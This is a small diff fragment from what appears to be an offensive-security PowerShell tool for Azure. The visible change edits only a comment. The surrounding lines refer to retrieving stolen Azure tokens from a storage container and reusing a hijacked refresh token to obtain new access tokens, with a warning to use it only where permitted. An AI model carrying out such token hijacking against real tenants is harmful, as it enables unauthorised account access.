@@ -115,7 +115,7 @@ $HiJackedTokens = Get-StolenAzureTokens -ContainerUri 'https://pentestexample.bl
         WARNING: This Function should only be used in environments where you have explicit permission
 #>
 
-#Now let's use the hijacked refresh token to get ANOTHER Access token before it expires.
+#Now lets use the hijacked refresh token to get ANOTHER Access token before it expires.
 function Update-StolenAzureTokens {
     [CmdletBinding()]
     param ()   
